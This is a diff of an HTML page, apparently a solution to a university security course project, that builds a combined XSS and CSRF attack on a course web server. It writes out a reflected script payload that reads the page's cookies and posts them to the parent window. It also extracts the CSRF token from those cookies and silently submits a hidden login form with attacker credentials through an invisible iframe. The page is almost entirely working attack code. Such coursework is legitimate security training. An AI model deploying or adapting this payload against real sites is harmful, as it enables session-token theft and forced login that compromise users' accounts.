@@ -1,25 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<head>
-  <meta name="description" content="Webpage description goes here" />
-  <meta charset="utf-8">
-  <title>Change_me</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="">
-<!--   <link rel="stylesheet" href="css/style.css">
- -->  <script src="http://code.jquery.com/jquery-latest.min.js"></script>
-</head>
-
-<body>
-  
-<div class="container">
-  
-</div>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
+</script>
 
 <script>
+// use these lines to generate the URL
+var string1 = "$(document).ready(function() { console.log(window.document.cookie); window.parent.postMessage(window.document.cookie, '*'); })"
+var totalstring = "<script" + ">" + string1 + "</" + "script>";
+var urlencoded = encodeURIComponent(totalstring);
+var actualURL = "http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=" + urlencoded;
+
+// listen for postmessage
+window.addEventListener("message",function (e) {
+  var token = e.data.split("csrf_token=")[1].split(";")[0];
+	var input = document.createElement("input");
+	input.type = "hidden";
+	input.name = "csrf_token";
+	input.value = token;
+	document.getElementById("csrfForm").appendChild(input);
+	document.getElementById("csrfForm").submit();
+}, false);
 
 </script>
 
-</body>
-</html>
+<body>
+<iframe style="display:none" id = "overallFrame" name = "csrfFrame" src="http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3E%24(document).ready(function()%20%7B%20console.log(window.document.cookie)%3B%20window.parent.postMessage(window.document.cookie%2C%20'*')%3B%20%7D)%3C%2Fscript%3E"></iframe>
+<form id="csrfForm" method="POST" target="csrfFrame" action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="123456" /> 
+</form>
+
+
